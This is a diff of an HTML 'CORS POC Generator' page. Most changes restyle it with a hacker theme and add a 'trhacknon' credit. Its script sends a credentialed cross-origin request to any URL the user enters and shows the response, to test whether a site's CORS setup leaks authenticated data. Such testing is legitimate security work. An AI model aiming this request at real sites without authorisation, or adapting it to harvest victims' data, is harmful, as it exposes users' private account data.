@@ -1,58 +1,123 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-	<title>Cors Exploit</title>
-	<!-- Latest compiled and minified CSS -->
-	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-	<!-- Optional theme -->
-	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
-	<!-- Latest compiled and minified JavaScript -->
-	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cors Exploit</title>
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <!-- Optional theme -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+    <!-- Latest compiled and minified JavaScript -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    <style>
+        body {
+            background-color: #000; /* Black background for hacker feel */
+            color: #00FF00; /* Fluorescent green text */
+            font-family: 'Courier New', Courier, monospace; /* Monospace font for hacker style */
+        }
+        .jumbotron {
+            background-color: #002b36; /* Dark teal background */
+            color: #FF6600; /* Fluorescent orange text */
+            border-radius: 0;
+            padding: 2rem;
+            margin-bottom: 0;
+            animation: pulse 2s infinite;
+        }
+        .container {
+            margin-top: 2rem;
+        }
+        .btn-primary {
+            background-color: #00FF00; /* Fluorescent green button */
+            border-color: #00FF00;
+            color: #000; /* Black text */
+        }
+        .btn-primary:hover {
+            background-color: #00CC00; /* Slightly darker green on hover */
+            border-color: #00CC00;
+        }
+        .footer-copyright {
+            background-color: #002b36; /* Dark teal footer */
+            color: #FF6600; /* Fluorescent orange text */
+            padding: 1rem;
+        }
+        .text-muted {
+            color: #FF6600; /* Fluorescent orange for muted text */
+        }
+        .form-control {
+            background-color: #003333; /* Dark background for input fields */
+            color: #00FF00; /* Fluorescent green text */
+            border: 1px solid #00FF00; /* Fluorescent green border */
+        }
+        .form-control:focus {
+            background-color: #002b36; /* Slightly darker background on focus */
+            border-color: #00CC00; /* Darker green border on focus */
+            color: #00FF00; /* Fluorescent green text on focus */
+        }
+        .logo {
+            width: 150px; /* Adjust as needed */
+            margin: 0 auto;
+            display: block;
+            animation: rotate 5s linear infinite; /* Rotate animation */
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-	<div class="jumbotron text-center">
-		<h1>CORS POC Generator</h1>
-		<p>Generate CORS Vulnerability POC using this web Script</p>
-	</div>
-	<div class="container">
-		<div class="row">
-		  <div class="col-sm-4"></div>
-		  <div class="col-sm-4 form-group">			
-			<div id="demo" class="row">
-				<div class="col">
-					<label for="url">Enter URL</label>
-					<input type="text" name="url" id="url" class="form-control"><br>
-				</div>
-				<div class="col">
-					<button type="button" onclick="cors()" class="form-control btn btn-primary btn-sm">Generate</button>	
-				</div>
-			</div>
-		  </div>
-		  <div class="col-sm-4"></div>
-		</div>
-		<div class="text-center text-muted">
-			<p>Enter a URL and Click generate if You see Alert With JSON data than its Exploitable!! Enjoy:) </p>
-		</div>
-	  </div>
-<footer class="page-footer font-small" style="position: fixed; left: 0; bottom: 0; width: 100%; text-align: center;">
-	<div class="footer-copyright text-center py-3">© GNU General Public License v3.0:
-	  <a href="https://vral-parmar.github.io/vral_parmar/"> Viral Parmar</a>
-	</div>
-  </footer>
-<script type="text/javascript">
-	function cors(){
-		var url = document.getElementById('url').value;
-		var xhttp = new XMLHttpRequest();
-		xhttp.onreadystatechange = function(){
-			if(this.readyState == 4 && this.status == 200){
-				document.getElementById('demo').innerHTML = alert(this.responseText);
-
-			}
-		};
-		xhttp.open('GET', url,true);
-		xhttp.withCredentials = true;
-		xhttp.send();
-	}
-</script>
+    <div class="jumbotron text-center">
+        <img src="logo.svg" alt="Logo" class="logo"> <!-- Logo animation -->
+        <h1>CORS POC Generator</h1>
+        <p>Generate CORS Vulnerability POC using this web script</p>
+    </div>
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-4"></div>
+            <div class="col-sm-4 form-group">            
+                <div id="demo" class="row">
+                    <div class="col">
+                        <label for="url">Enter URL</label>
+                        <input type="text" name="url" id="url" class="form-control"><br>
+                    </div>
+                    <div class="col">
+                        <button type="button" onclick="cors()" class="form-control btn btn-primary btn-sm">Generate</button>    
+                    </div>
+                </div>
+            </div>
+            <div class="col-sm-4"></div>
+        </div>
+        <div class="text-center text-muted">
+            <p>Enter a URL and click generate. If you see an alert with JSON data, then it's exploitable!! Enjoy :)</p>
+        </div>
+    </div>
+    <footer class="page-footer font-small">
+        <div class="footer-copyright text-center py-3">© GNU General Public License v3.0:
+            <a href="https://vral-parmar.github.io/vral_parmar/" style="color: #FF6600;"> Viral Parmar</a>
+        </div>
+        <div class="text-center text-muted">
+            <p>Developed by <strong>trhacknon</strong></p>
+        </div>
+    </footer>
+    <script type="text/javascript">
+        function cors(){
+            var url = document.getElementById('url').value;
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function(){
+                if(this.readyState == 4 && this.status == 200){
+                    alert(this.responseText);
+                }
+            };
+            xhttp.open('GET', url, true);
+            xhttp.withCredentials = true;
+            xhttp.send();
+        }
+    </script>
 </body>
 </html>
